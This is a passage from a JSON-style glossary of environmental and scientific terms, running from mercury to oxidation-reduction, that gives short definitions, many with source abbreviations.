with symbol Hg and atomic number 80 occurring principally in cinnabar: used in thermometers, barometers, mercury-vapour lamps, and dental amalgams.\"], \"metabolism\": [\"All the chemical reactions that take place in a living organism, comprising both anabolism and catabolism.\"], \"metabolite\": [\"A product of intermediary metabolism.\"], \"metallic mineral\": [\"Mineral containing metals, such as bauxite, pyrite, etc.\"], \"metal oxide\": [\"Any binary compound in which oxygen is combined with one or more metal atoms.\"], \"metal plating\": [\"A thin, adherent layer of metal on an object.\"], \"metal\": [\"An opaque crystalline material usually of high strength with good electrical and thermal conductivities, ductility and reflectivity.\"], \"meteorological forecasting\": [\"A branch of science that studies the dynamics of the atmosphere and the direct effects of the atmosphere upon the Earth's surface, oceans and inhabitants, focusing particularly on weather and weather conditions.\"], \"meteorology\": [\"The science concerned with the atmosphere and its phenomena.\"], \"methane\": [\"A colourless, odourless, and tasteless gas, lighter than air and reacting violently with chlorine and bromine in sunlight, a chief component of natural gas; used as a source of methanol, acetylene, and carbon monoxide.\"], \"methodology\": [\"The system of methods and principles used in a particular discipline.\"], \"metropolis\": [\"A large city, specifically that city in a country which is the seat of government, of ecclesiastical authority, or of commercial activity.\\\\n(Source: GOOD)\"], \"microbiological analysis\": [\"Analysis for the identification of viruses, bacteria, fungi and parasites.\"], \"microbiology\": [\"The science and study of microorganisms, including protozoans, algae, fungi, bacteria, viruses, and rickettsiae.\\\\n(Source: MGH)\"], \"microclimate\": [\"The local, rather uniform climate of a specific place or habitat, compared with the climate of the entire area of which it is a part.\"], \"microclimate effect\": [\"An effect on the climate on a small scale, such as a single forest or other bounded area.\"], \"microclimatology\": [\"The study of a microclimate, including the study of profiles of temperature, moisture and wind in the lowest stratum of air, the effects of the vegetation and of shelterbelts, and the modifying effects of towns and buildings.\\\\n(Source: MGH)\"], \"microcomputer\": [\"A microprocessor combined with input/output interface devices, some type of external memory, and the other elements required to form a working computer system; it is smaller, lower in cost, and usually slower than a minicomputer.\\\\n(Source: MGH)\"], \"microecosystem\": [\"A small-scale, simplified, experimental ecosystem, laboratory- or field- based, which may be: a) derived directly from nature (e.g. when samples of pond water are maintained subsequently by the input of artificial light and gas-exchange); or b) built up from axenic cultures (a culture of an organism that consists of one type of organism only, i.e. that is free from any contaminating organism) until the required conditions of organisms and environment are achieved. Also known as microcosm.\\\\n(Source: ALL2)\"], \"microelectronics\": [\"The technology of constructing circuits and devices in extremely small packages by various techniques.\\\\n(Source: MGH)\"], \"microfiltration\": [\"The separation or removal from a liquid of particulates and microorganisms in the size range of 0.1 to 0.2 microns in diameter.\"], \"micropollutant\": [\"Pollutant which exists in very small traces in water.\\\\n(Source: PHC)\"], \"microscopy\": [\"The interpretative application of microscope magnification to the study of materials that cannot be properly seen by the unaided eye.\"], \"microwave\": [\"An electromagnetic wave which has a wavelength between about 0.3 and 30 centimeters, corresponding to frequencies of 1-100 gigahertz; however there are no sharp boundaries between microwaves and infrared and radio waves.\", \"An appliance for cooking food using microwave energy.\", \"To cook or heat in a microwave oven.\"], \"animal migration\": [\"Movements that particular animals carry out regularly often between breeding places and winter feeding grounds.\"], \"migratory bird\": [\"A bird which migrates in a group.\"], \"migratory species\": [\"A species that moves from one biome to another for food or to breed.\"], \"military air traffic\": [\"Air traffic of or relating to the armed forces.\"], \"military zone\": [\"Area whose utilization is exclusively reserved to the army.\"], \"milk\": [\"The whitish fluid secreted by the mammary gland for the nourishment of the young; composed of carbohydrates, proteins, fats, mineral salts, vitamins, and antibodies.\", \"To draw milk from (a mammal, especially a cow).\"], \"mill\": [\"A building where grain is crushed into flour.\", \"An establishment where products are manufactured using industrial methods.\"], \"mine\": [\"An opening or excavation in the earth for extracting minerals.\\\\n(Source: MGH)\", \"An explosive device, concealed under or on the ground and designed to destroy or disable enemy targets as they pass over or near the device.\", \"To extract from the earth by excavation.\"], \"mineral deposit\": [\"A mass of naturally occurring mineral material, e.g. metal ores or nonmetallic mineral, usually of economic value, without regard to mode of origin.\\\\n(Source: BJGEO)\"], \"mineralogy\": [\"The science which concerns the study of natural inorganic substances called minerals.\\\\n(Source: MGH)\"], \"mineral\": [\"A naturally occurring substance with a characteristic chemical composition expressed by a chemical formula; may occur as individual crystals or may be disseminated in some other material or rock.\"], \"mineral water\": [\"Water containing naturally or artificially supplied minerals or gases.\"], \"mining district\": [\"A district where mineral exploitation is performed.\"], \"mining engineering\": [\"Engineering concerned with the discovery, development and exploitation of coal, ores, and minerals, as well as the cleaning, sizing and dressing of the product.\"], \"mining geology\": [\"The study of geologic aspects of mineral deposits, with particular regard to problems associated with mining.\"], \"mining industry\": [\"A sector of the economy in which an aggregate of commercial enterprises is engaged in the extraction of minerals occurring naturally, often involving quarrying, well operations, milling, exploration and development.\\\\n(Source: SIC)\"], \"mining regulation\": [\"A rule or order prescribed by government or management to promote the safety, legality or ecological responsibility of any aspect of the process or industry of ore extraction.\\\\n(Source: BLD)\"], \"ministry\": [\"The body of top government administrators or other high ranking public officials that are selected by a head of state to manage certain aspects of a state's affairs, as opposed to civil servants whose tenure is unaffected by public changes resulting from democratic elections or some other process.\"], \"minority\": [\"A group that is different racially, politically, etc. from a larger group of which it is a part.\"], \"miscibility\": [\"The tendency or capacity of two or more liquids to form a uniform blend, that is, to dissolve in each other; degrees are total miscibility, partial miscibility, and immiscibility.\\\\n(Source: MGH)\"], \"mite\": [\"An order of small Arachnida with rounded bodies. Mites are very abundant in the soil, feeding on plant material and invertebrate animals. Some parasitic mites (e.g. red spider) damage crops and can be serious pests. Others cause diseases in animals. Ticks are blood-suckers, some being vectors of diseases such as Rocky Mountain spotted fever in humans and fowls, and louping ill in cattle and sheep.\\\\n(Source: ALL)\"], \"mitigation measure\": [\"Any procedure or action undertaken to reduce the adverse impacts that a project or activity may have on the environment.\\\\n(Source: TOE)\"], \"mixed forest\": [\"A forest composed of broadleaf trees and coniferous trees.\"], \"mixed use area\": [\"Use of land for more than one purpose; e.g. grazing of livestock, watershed and wildlife protection, recreation, and timber production.\\\\n(Source: RRDA)\"], \"mixing\": [\"The intermingling of different materials to produce a homogeneous mixture.\"], \"mobile home\": [\"Living quarters mounted on wheels and capable of being towed by a motor vehicle.\\\\n(Source: CED)\"], \"model\": [\"A representation, usually on a smaller scale, of a device, structure, etc. \\\\n(Source: CED /  LEE)\", \"A person who serves as a subject for artwork, usually in the medium of photography but also for painting or drawing.\", \"Person whose job is to wear clothes in order to present them.\", \"A quantitative or mathematical representation or computer simulation which attempts to describe the characteristics or relationships of physical events.\", \"A grouping based on shared characteristics.\", \"To display an object for others to see, especially in regard to wearing clothing while performing the role of a fashion model.\", \"To create from a substance such as clay.\", \"A typical example or instance.\", \"A type of product.\"], \"moisture\": [\"Water that is dispersed through a gas in the form of water vapour or small droplets, dispersed through a solid, or condensed on the surface of a solid.\"], \"molecular biology\": [\"The study of the chemical structures and processes of biological phenomena at the molecular level; the discipline is particularly concerned with the study of proteins, nucleic acids, and enzymes, the macromolecules essential to life processes. It seeks to understand the molecular basis of genetic processes. Techniques used include X-ray diffraction and electron microscopy.\\\\n(Source: GILP96)\"], \"monitoring\": [\"The regularly checking in order to perceive change in some quality or quantity.\\\\n(Source: BRACK)\"], \"monitoring technique\": [\"Techniques employed in the process of checking, observing and measuring events, processes or physical, chemical, biological and environmental phenomena.\\\\n(Source: ZINZANa /  DUNSTEa)\"], \"monopoly\": [\"The market condition where a particular commodity or service has only one seller.\"], \"monument\": [\"An object, especially large and made of stone, built to remember and show respect to a person or group of people, or a special place made for this purpose.\", \"A burial vault (usually for some famous person).\"], \"moor\": [\"A tract of unenclosed waste ground, usually covered with heather, coarse grass, bracken, and moss.\"], \"moral persuasion\": [\"Appealing to the ethical principles or beliefs of an adversary or the public to convince the adversary to change behavior or attitudes.\"], \"morphology\": [\"The branch of biology concerned with the form and structure of organisms.\", \"In linguistics, the study of word structure.\"], \"mortality\": [\"The number of deaths occurring in a given population for a given period of time.\"], \"moss\": [\"Any plant of the class Bryophyta, occurring in nearly all damp habitats.\"], \"motorcycle\": [\"Single-track, two-wheeled motor vehicle.\"], \"motor fuel\": [\"Any gaseous or liquid flammable fuel that burns in an internal combustion engine.\"], \"motor vehicle\": [\"A road vehicle driven by a motor or engine, especially an internal combustion engine.\"], \"mountain\": [\"A feature of the earth's surface that rises high above the base and has generally steep slopes and a relatively small summit area.\", \"A great number or large amount of things not placed in a pile.\"], \"mountaineering\": [\"The sport, hobby or profession of walking, hiking and climbing up mountains.\"], \"mountainous area\": [\"Area characterized by conspicuous peaks, ridges, or mountain ranges.\\\\n(Source: BJGEO)\"], \"mountain range\": [\"A single, large mass consisting of a succession of mountains or narrowly spaced mountain ridges, with or without peaks, closely related in position, direction, formation, and age.\"], \"mowing\": [\"The cutting down of grass, crops or grain with a scythe or a mechanical device.\"], \"mud flat\": [\"A relatively level area of fine silt along a shore (as in a sheltered estuary) or around an island, alternately covered and uncovered by the tide, or covered by shallow water.\"], \"mulch\": [\"A layer of organic material applied to the surface of the ground to retain moisture.\"], \"multilateral agreement\": [\"A binding agreement between three or more parties.\"], \"multinational firm\": [\"A business company operating in multiple countries.\"], \"municipal cleansing\": [\"The aggregation of services offered by a town or city in which streets and other public areas are kept clean, such as through trash pick-ups, street sweeping and decontamination of water, soil and other natural resources.\\\\n(Source: FFD)\"], \"municipality\": [\"A town, city, or other district having powers of local self-government.\\\\n(Source: LANDY)\"], \"municipal level\": [\"The jurisdiction, position or status of city, town or local government.\\\\n(Source: DAM / OED)\"], \"muscular system\": [\"The muscle cells, tissues, and organs that effect movement in all vertebrates.\"], \"museum\": [\"A place or building where objects of historical, artistic, or scientific interest are exhibited, preserved or studied.\\\\n(Source: CED)\", \"Of or relating to a museum.\"], \"mushroom\": [\"An organism belonging to a family of Basidiomycetes that are characterized by the production of spores on gills.\"], \"music\": [\"The artistic organisation of sounds or tones that expresses ideas and emotions through the elements of rhythm, melody, harmony and tonal colour.\", \"A document which contains a musical composition in printed or written form.\"], \"mussel farming\": [\"Breeding of mussels for sale as food.\"], \"mustelid\": [\"A large, diverse family of low-slung, long-bodied carnivorous mammals including minks, weasels, and badgers; distinguished by having only one molar in each upper jaw, and two at the most in the lower jaw.\"], \"mutagenicity\": [\"The property of chemical or physical agents of inducing changes in genetic material that are transmitted during cell division.\"], \"mutagen\": [\"An agent that raises the frequency of mutation of genetic material above the spontaneous rate.\"], \"mutant\": [\"An individual bearing an allele that has undergone mutation and is expressed in the phenotype.\"], \"mutation\": [\"A change in the chemical constitution of the DNA in the chromosomes of an organism.\"], \"mycology\": [\"The branch of botany concerned with the study of fungi.\"], \"mycorrhiza\": [\"The symbiotic association of the root of a higher plant with a fungus.\"], \"national legislation\": [\"A binding rule or body of rules prescribed by the government of a sovereign state that holds force throughout the regions and territories within the government's dominion.\\\\n(Source: RHW)\"], \"national park\": [\"Areas of outstanding natural beauty, set aside for the conservation of flora, fauna and scenery, and for recreation, if this does not conflict with the conservation objectives of the parks and their landscapes. Hunting, logging, mining, commercial fishing, agriculture and livestock grazing are all controlled within national parks, as is industrial activity.\\\\n(Source: WRIGHT)\"], \"natural area\": [\"An area of certain natural conditions, as opposed to a civilized area shaped and inhabited mainly by humans.\"], \"natural disaster\": [\"Violent, sudden and destructive change in the environment without cause from human activity, due to phenomena such as floods, earthquakes, fire and hurricanes.\"], \"natural fertiliser\": [\"Organic material added to the soil to supply chemical elements needed for plant nutrition.\"], \"natural forest\": [\"A forest area that has developed free from the influence of humans and remains largely unaffected by their activities.\"], \"natural gas\": [\"A natural fuel containing methane and hydrocarbons that occurs in certain geologic formations.\\\\n(Source: LANDY)\"], \"natural gas extraction\": [\"The tapping of natural gas from wells located under the sea and in general from underground sources often in association with petroleum deposits; it is used as a fuel, having largely replaced coal-gas for this purpose, and as a source of intermediates for organic synthesis.\"], \"natural hazard\": [\"The probability of occurrence, within a specific period of time in a given area of a potentially damaging phenomenon of nature.\\\\n(Source: GUNN)\"], \"natural heritage\": [\"Generally, the world's natural resources as handed down to the present generation, and specifically, the earth's outstanding physical, biological and geological formations, and habitats of threatened species of animals and plants and areas with scientific, conservation or aesthetic value.\\\\n(Source: WHC /  OED)\"], \"rights of nature\": [\"A rule or body of rules that derives from nature and is believed to be binding upon human society, as opposed to human-made laws such as legislative acts and judicial decisions.\\\\n(Source: WOR / INP)\"], \"natural monument\": [\"A natural/cultural feature which is of outstanding or unique value because of its inherent rarity, representative of aesthetic qualities or cultural significance. Guidance for selection of a natural monument is: a) The area should contain one or more features of outstanding significance (appropriate natural features include spectacular waterfalls, caves, craters, fossil beds, sand dunes and marine features, along with unique or representative fauna and flora; associated cultural features might include cave dwellings, cliff-top forts, archaeological sites, or natural sites which have heritage significance to indigenous peoples).; b) The area should be large enough to protect the integrity of the feature and its immediately related surroundings.\\\\n(Source: AERG)\"], \"natural park\": [\"A designation project of lands which preserves natural resources for their scientific, scenic, cultural and/or educational value by limiting development and management practices. Land managed to protect rare and endangered species of flora and fauna will be designed as natural areas.\\\\n(Source: LANDY)\"], \"natural radioactivity\": [\"Radiation stemming mainly from uranium, present in small amounts in many rocks, soils, building material, etc.\"], \"natural resource\": [\"A feature or component of the natural environment that is of value in serving human needs, e.g. soil, water, plantlife, wildlife, etc.\"], \"natural science\": [\"The branches of science dealing with objectively measurable phenomena pertaining to the transformation and relationships of energy and matter; includes biology, physics, and chemistry.\"], \"natural stone\": [\"A stone that occurs in nature, as distinguished from a man-made substitute.\"], \"nature conservation\": [\"Active management of the earth's natural resources and environment to ensure their quality is maintained and that they are wisely used.\\\\n(Source: PHC)\"], \"nature reserve\": [\"Area allocated to preserve and protect certain animals and plants, or both.\"], \"nausea\": [\"Desire to vomit.\"], \"necrosis\": [\"The pathologic death of living tissue in a plant or animal.\"], \"need\": [\"To need a number or amount of something, but not having any at all.\", \"The feeling of the lack of something.\", \"To need a number or amount of something, but not having enough or any at all.\", \"What is necessary to satisfy a need.\", \"To feel that something is necessary.\"], \"nematode\": [\"A group of unsegmented worms which have been variously recognized as an order, class, and phylum.\", \"One of the most common phyla of animals, with over 80,000 different described species (of which over 15,000 are parasitic). They are ubiquitous in freshwater, marine, and terrestrial environments, where they often outnumber other animals in both individual and species counts, and are found in locations as diverse as Antarctica and oceanic trenches.\"], \"nervous system\": [\"A coordinating and integrating system which functions in the adaptation of an organism to its environment; in vertebrates, the system consists of the brain, brainstem, spinal cord, cranial and peripheral nerves, and ganglia.\"], \"net resource depletion\": [\"The total decrease in the amount of natural materials available for use by humans and other living beings.\"], \"neurotoxicity\": [\"The occurrence of adverse effects on a nervous system following exposure to a chemical.\\\\n(Source: KOREN)\"], \"neutralisation\": [\"The act of making a solution neutral by adding a base to an acidic solution, or an acid to a basic solution.\"], \"new community\": [\"A sociopolitical, religious, occupational or other group of common characteristics and interests formed as an alternative to social, and often residential, options currently available.\\\\n(Source: RHW)\"], \"nickel\": [\"A malleable ductile silvery-white metallic element that is strong and corrosion-resistant, occurring principally in pentlandite and niccolite: used in alloys, especially in toughening steel, in electroplating, and as a catalyst in organic synthesis.\\\\n(Source: CED)\"], \"nitrate\": [\"Any salt or ester of nitric acid, such as sodium nitrate.\"], \"nitrification\": [\"The process by which ammonia compounds, including man-made fertilizer and the humus provided by organic matter or plant and animal origin, are converted into nitrites and then nitrates, which are then absorbed as a nutrient by crops.\"], \"nitrite\": [\"A salt or ester of nitric acid, included in compounds such as potassium nitrite, sodium nitrite and butyl nitrite.\"], \"nitro compound\": [\"Any one of a class of usually organic compounds that contain the monovalent group, -NO2 (nitro group or radical) linked to a carbon atom.\"], \"nitrogen\": [\"Gaseous, non-metallic chemical element with symbol N and atomic number 7.\"], \"nitrogen cycle\": [\"The complex set of processes by which crops acquire the large amount of nitrogen they need to make proteins, nucleic acids and other biochemicals of which they are composed, and how the nitrogen returns to the atmosphere.\"], \"nitrogen dioxide\": [\"A reddish-brown gas; it exists in varying degrees of concentration in equilibrium with other nitrogen oxides; used to produce nitric acid.\"], \"nitrogen fixation\": [\"Assimilation of atmospheric nitrogen by a variety of microorganisms which live freely in soil.\"], \"nitrogen monoxide\": [\"A colourless gas, soluble in water, ethanol and ether.\"], \"nitrosamine\": [\"Any one of a class of neutral, usually yellow oily compounds containing the divalent group.\"], \"noise\": [\"Sound which is unwanted, either because of its effects on humans, its effect on fatigue or malfunction of physical equipment, or its interference with the perception or detection of other sounds.\", \"A random and unwanted signal.\"], \"noise analysis\": [\"Determination of the frequency components that make up a particular noise being studied.\\\\n(Source: MGH)\"], \"noise barrier\": [\"A barrier for reducing the propagation of sound that are widely used in industry and alongside roads and railways.\"], \"noise emission\": [\"The release of noise into the environment from various sources that can be grouped in: transportation activities, industrial activities and daily normal activities.\"], \"noise immission\": [\"Immission in the environment of acoustic vibrations that negatively affect human beings, animals, plants or other objects.\"], \"noise level\": [\"Physical quantity of unwanted sound measured, usually expressed in decibels.\"], \"noise measurement\": [\"The process of quantitatively determining one or more properties of acoustic noise.\"], \"noise pollutant\": [\"Noise in the environment which can be harmful to human beings, animals and plants.\\\\n(Source: ISEP)\"], \"noise pollution\": [\"Harmful or unwanted sounds in the environment, which in specific places, can be measured and averaged over a period of time.\"], \"noise protection\": [\"Adoption of measures for controlling noise pollution, such as restriction of the emission of noise from industrial, commercial and domestic premises, from motor vehicles and aircrafts, the provision of noise barriers and buffer zones, the fitting of sound attenuation equipment, etc.\\\\n(Source: CONFERa /  GILP96a)\"], \"nomad\": [\"A member of a people or tribe who move from place to place to find pasture and food.\"], \"nomenclature\": [\"The body of specialized words relating to a particular subject.\"], \"non-ferrous metal\": [\"Any metal other than iron and its alloys.\"], \"non-metallic mineral\": [\"Minerals containing non-metals, such as quartz, garnet, etc.\\\\n(Source: RRDA)\"], \"non-metal\": [\"A chemical element, that does not have the chemical or physical properties of a metal, e. g. oxygen or sulfur.\"], \"non-polluting fuel\": [\"Clean fuel that does not release polluting emissions in the environment, such as methane.\"], \"non-renewable resource\": [\"A natural resource which, in terms of human time scales, is contained within the Earth in a fixed quantity and therefore can be used once only in the foreseeable future (although it may be recycled after its first use).\"], \"non-returnable container\": [\"Any container for which no specific provisions for its return from the consumer or final use has been established.\"], \"norm\": [\"An established standard, guide, or regulation.\", \"The most common and popular way of thinking among a population.\"], \"normalisation\": [\"(Database) The process of structuring data to minimise duplication and inconsistencies.\"], \"North Africa\": [\"A geographic region of the African continent south of Europe and the Mediterranean Sea, and north of Africa's tropical rain forest, including Morocco, Algeria, Tunisia, Libya and the Egyptian region west of the Suez Canal, and also the Sahara Desert and Atlas Mountains.\"], \"North America\": [\"A continent in the northern half of the western hemisphere, bounded by the Arctic Ocean in the north, by the Pacific Ocean and the Bering Sea in the west, and by the Atlantic Ocean and the Gulf of Mexico in the east, connected to South America by the Isthmus of Panama, and including the United States, Canada, Mexico and several small island nations.\\\\n(Source: INP)\"], \"North Atlantic Ocean\": [\"The northern part of the Atlantic Ocean, extending northward from the equator to the Arctic Ocean.\"], \"North Pacific Ocean\": [\"An ocean north of the equator between the eastern coast of Asia and the western coasts of the Americas, extending northward to the arctic region, with principal arms including the Gulf of Alaska, the Sea of Okhotsk, the Sea of Japan and the Bering, Yellow, East China, South China and Philippine seas, and islands including the Aleutian, Midway, Marshall and Hawaiian islands, the Japanese island arc and the Malay Archipelago.\"], \"novel food\": [\"A type of food that does not have a significant history of consumption or is produced by a relatively new method.\"], \"nuclear accident\": [\"An event occurring in a nuclear power plant or anywhere that radioactive materials are used, stored, or transported and involving the release of potentially dangerous levels of radioactive materials into the environment.\\\\n(Source: FEMAa)\"], \"nuclear energy\": [\"Energy released by nuclear fission or nuclear fusion.\"], \"nuclear facility\": [\"A place, including buildings, where all the activities relating to nuclear research are performed.\\\\n(Source: CAMB)\"], \"nuclear fission\": [\"The division of an atomic nucleus into parts of comparable mass; usually restricted to heavier nuclei such as isotopes of uranium, plutonium, and thorium.\"], \"nuclear fuel\": [\"Material that can be used in nuclear fission or fusion to create nuclear energy.\"], \"nuclear fuel element\": [\"A piece of nuclear fuel which has been formed and coated, and is ready to be placed in a reactor fuel assembly.\"], \"nuclear fusion\": [\"Combination of two light nuclei to form a heavier nucleus with release of some binding energy.\"], \"nuclear physics\": [\"The study of the characteristics, behaviour and internal structures of the atomic nucleus.\"], \"nuclear debate\": [\"The ongoing, public discussion and dispute over the uses of nuclear energy.\"], \"nuclear power plant\": [\"A power plant in which nuclear energy is converted into heat for use in producing steam for turbines, which in turn drive generators that produce electric power.\"], \"nuclear reaction\": [\"A reaction involving a change in an atomic nucleus, such as fission, fusion, neutron capture, or radioactive decay, as distinct from a chemical reaction, which is limited to changes in the electron structure surrounding the nucleus.\"], \"nuclear reactor\": [\"Device which creates heat and energy by starting and controlling atomic fission.\"], \"nuclear safety\": [\"Measures and techniques implemented to reduce the possibility of incidence and the potential harm posed by radioactive substances used as an energy source, a test material or in weaponry.\"], \"nuclear test\": [\"Test performed to evaluate nuclear weapons.\"], \"nuclear weapon\": [\"Any bomb, warhead, or projectile using active nuclear material to cause a chain reaction upon detonation.\"], \"nucleic acid\": [\"Any of several organic acids combined with proteins (DNA or RNA) which exist in the nucleus and protoplasm of all cells.\"], \"nuisance\": [\"Something which annoys.\"], \"nutrient medium\": [\"A liquid or gel designed to support the growth of microorganisms, cells or small plants.\"], \"nutrient content\": [\"The amount of proteins, carbohydrates, fats, inorganic salts (e.g. nitrates, phosphates), minerals (e.g. calcium, iron), and water.\"], \"nutrient cycle\": [\"A biogeochemical cycle, in which inorganic nutrients move through the soil, living organisms, air and water or through some of these.\"], \"nutrient removal\": [\"Elimination of nutrients as, for example, from sewage in order to prevent eutrophication of water in reservoirs.\"], \"nutrient\": [\"Chemical elements which are involved in the construction of living tissue and which are needed by both plant and animal. The most important in terms of bulk are carbon, hydrogen and oxygen, with other essential ones including nitrogen, potassium, calcium, sulphur and phosphorus.\"], \"nutrition\": [\"Chemical elements which are involved in the construction of living tissue and which are needed by both plant and animal. The most important in terms of bulk are carbon, hydrogen and oxygen, with other essential ones including nitrogen, potassium, calcium, sulphur and phosphorus.\", \"A process in animals and plants involving the intake of nutrient materials and their subsequent assimilation into the tissues.\"], \"oak\": [\"Any tree of the genus Quercus in the order Fagales, characterized by simple, usually lobed leaves, scaly winter buds, a star-shaped pith, and its fruit, the acorn, which is a nut; the wood is tough, hard, and durable, generally having a distinct pattern.\", \"Wood of the oak tree.\"], \"objection\": [\"The act of a party who objects to some matter or proceeding in the course of a trial or an argument or reason urged by him in support of his contention that the matter or proceeding objected to is improper or illegal.\\\\n(Source: BLACK)\", \"An argument that contradicts what is said by other persons.\"], \"obligation to label\": [\"The legal responsibility or duty compelling manufacturers to affix certain marks or other written identification to their products, as is directed by laws, regulations or government standards.\"], \"occupational disease\": [\"A functional or organic disease caused by factors arising from the operations or materials of an individual's industry, trade, or occupation.\"], \"occupational medicine\": [\"The branch of medicine which deals with the relationship of humans to their occupations, for the purpose of the prevention of disease and injury and the promotion of optimal health, productivity, and social adjustment.\"], \"occupational safety regulation\": [\"Law enacted to reduce the incidence among workers of personal injuries, illnesses, and deaths resulting from employment.\"], \"ocean\": [\"The mass of water occupying all of the Earth's surface not occupied by land, but excluding all lakes and inland seas.\"], \"ocean circulation\": [\"Water current flow in a closed circular pattern within an ocean.\"], \"ocean current\": [\"A net transport of ocean water along a definable path.\\\\n(Source: MGH)\"], \"ocean dumping\": [\"The process by which pollutants, including sewage, industrial waste, consumer waste, and agricultural and urban runoff are discharged into the world's oceans.\"], \"Oceania\": [\"The islands of the southern, western and central Pacific Ocean, including Melanesia, Micronesia, and Polynesia. The term is sometimes extended to encompass Australia, New Zealand, and the Malay Archipelago.\\\\n(Source: AMHER)\"], \"oceanography\": [\"The scientific study and exploration of the oceans and seas in all their aspects.\\\\n(Source: MGH)\"], \"ocean temperature\": [\"A measure, referenced to a standard value, of the heat or coldness in a body of oceanic water.\"], \"odonate\": [\"Order in the class of insecta that includes dragonflies and damselflies.\"], \"environmental criminality\": [\"Unlawful acts against the environment, such as water contamination, hazardous waste disposal, air contamination, unpermitted installation of plants, oil spills, etc.\\\\n(Source: AZENPa)\"], \"office\": [\"Any room, set of rooms or building used for the administration of government service, business transactions or other work related activities.\", \"Any building used for the administration of government service, business transactions or other work related activities.\", \"The actions and activities assigned to or required or expected of a person or group.\", \"Professional or clerical workers in an office.\"], \"official hearing\": [\"Proceedings of relative formality, with definite issues of fact or of law to be tried, in which witnesses are heard and parties proceeded against have right to be heard.\\\\n(Source: WESTS)\"], \"offshore oil drilling\": [\"Oil extraction from platforms situated a short distance from the coast.\"], \"oil binding agent\": [\"Highly absorbent agents used for physically removing spilled oil in case of leakages and oil accidents occurring in water bodies, industry, work-shops, on roads, etc.\"], \"oil boom\": [\"A floating device used to contain oil on a body of water.\", \"A boom in the oil producing sector of an economy.\"], \"oil disaster\": [\"The disaster caused by the dumping and accidental spillage of oil into waterways from ships and land-based or offshore installations. Oil pollution may destroy or damage aquatic life and wildlife such as birds, contaminate water supplies and create fire hazards.\\\\n(Source: GILP96)\"], \"oil pipeline\": [\"A line of pipe connected to valves and other control devices, for conducting oil.\"], \"oil pollution\": [\"Contamination of any ecosystem, but usually of freshwater or marine ecosystems, by oil or other petroleum products.\"], \"oil recovery vessel\": [\"A boat used for recovering oil spilled at sea from oil tankers.\"], \"oil refinery\": [\"A plant where crude petroleum is transformed into fuels, lubricants, and other petroleum-derived products.\"], \"oil refining\": [\"The separation of petroleum mixtures into their component parts.\"], \"oil shale\": [\"A kerogen-bearing, finely laminated brown or black sedimentary rock that will yield liquid or gaseous hydrocarbons on distillation.\"], \"oil slick\": [\"The mass of oil that floats on a surface of water, which is discharged accidentally, naturally or by design, and can be moved by currents, tides and the wind.\"], \"oil spill\": [\"Contamination of any ecosystem, but usually of freshwater or marine ecosystems, by oil or other petroleum products.\", \"The accidental release of oil, or other petroleum products usually into freshwater or marine ecosystems, and usually in large quantities.\"], \"oil tanker\": [\"A very large ship which carries crude oil or other petroleum products in big tanks.\"], \"olfactometry\": [\"The testing and measurement of the sensitivity of the sense of smell.\"], \"onchocerciasis\": [\"Infection with the filaria Onchocerca volvulus; results in skin tumours, papular dermatitis, and ocular complications.\"], \"oncology\": [\"The study of the causes, development, characteristics, and treatment of tumors.\"], \"opencast mining\": [\"The extraction of metal ores and minerals that lie near the surface by removing the overlying material and breaking and loading the ore.\", \"Superficial mining, in which the valuable rock is exposed by removal of overburden.\"], \"opinion\": [\"That which one holds to be true; the acceptance of a fact, opinion, or assertion as real or true despite a lack of strong evidence or knowledge.\", \"Judgement or belief not founded on certainty or proof.\"], \"ore\": [\"A mineral or mineral aggregate, mixed with gangue, that can be worked and treated at a profit.\"], \"organ\": [\"A fully differentiated structural and functional unit, such as a kidney or a root, in an animal or plant.\", \"A keyboard instrument played using one or more manuals and a pedalboard. Sound is produced by an airflow through metal or wood pipes and/or electronically by sampled organ sounds or oscillators.\"], \"organic carbon\": [\"Carbon which comes from an animal or plant. \\\\n\\\\n(Source: PHC)\"], \"organic chemistry\": [\"A branch of chemistry dealing with the study of composition, reaction, properties, etc. of organic compounds.\\\\n(Source: LEE)\"], \"organic farming\": [\"Farming without the use of industrially made fertilizers or pesticides.\"], \"organic solvent\": [\"Organic materials, including diluents and thinners, which are liquids at standard conditions and which are used as dissolvers, viscosity reducers, or cleaning agents.\\\\n(Source: LEE)\"], \"organic substance\": [\"Chemical compounds, based on carbon chains or rings and also containing hydrogen with or without oxygen, nitrogen, or other elements.\\\\n(Source: MGH)\"], \"organic waste\": [\"A type of waste which can be broken down into its base compounds by micro-organisms.\"], \"organism\": [\"An individual constituted to carry out all life functions.\"], \"organochlorine compound\": [\"Organic compounds containing a C-Cl bond.\"], \"organohalogen compound\": [\"Organic compounds containing a C-halogen bond.\"], \"organometallic compound\": [\"Molecules containing carbon-metal linkage; a compound containing an alkyl or aryl radical bonded to a metal.\\\\n(Source: MGH)\"], \"organonitrogen compound\": [\"Organic compounds having a C-N bond.\\\\n(Source: RRDA)\"], \"organooxygen compound\": [\"Compounds, both aliphatic and aromatic, which have a C-O bond, including alcohols, aldehydes, etc.\"], \"organophosphorous compound\": [\"Organic compound that contains phosphorous; short-lived, but some can be toxic when first applied.\\\\n(Source: EPAGLO)\"], \"organosilicon compound\": [\"Any natural substance composed of two or more unlike atoms held together by chemical bonds and containing silicon, a non-metallic element often found in rocks or minerals.\\\\n(Source: RHW)\"], \"organotin compound\": [\"Chemical compound used in anti-foulant paints to protect the hulls of boats and ships, buoys and pilings from marine organisms such as barnacles.\\\\n(Source: EPAGLO)\"], \"ornithology\": [\"The branch of zoology that deals with the study of birds, including their physiology, classification, ecology, and behaviour.\"], \"orography\": [\"The study of mountain systems and the depiction of their relief.\\\\n(Source: WHIT)\"], \"orthopteran\": [\"A heterogeneous order of generalized insects with gradual metamorphosis, chewing mouthparts, and four wings.\"], \"osmosis\": [\"The passage of a solvent through a semipermeable membrane separating two solutions of different concentrations.\"], \"local recreation\": [\"A pastime, diversion, exercise or other means of enjoyment and relaxation that is carried out in a particular city, town or small district.\"], \"overburden\": [\"The material such as soil and rock lying above a mineral deposit that must be removed in order to work the deposit.\"], \"overcrowding\": [\"An excess of people gathered together in a confined space.\"], \"overexploitation\": [\"The use of raw materials excessively without considering the long-term ecological impacts of such use.\\\\n(Source: WPR)\"], \"overfishing\": [\"Taking out of the sea more fish than natural population growth can sustain.\"], \"overgrazing\": [\"The damaging of land as a result of excessive animal grazing, for example sheep and goats.\"], \"overhead power line\": [\"Suspended cables by which electrical power is distributed throughout a country.\"], \"overpopulation\": [\"A population density that exceeds the capacity of the environment to supply the health requirements of the individual organism.\"], \"overwintering\": [\"The passing of winter in a particular place.\"], \"oxidation\": [\"A chemical reaction that increases the oxygen content of a compound.\"], \"oxidation-reduction\": [\"An oxidizing chemical change, 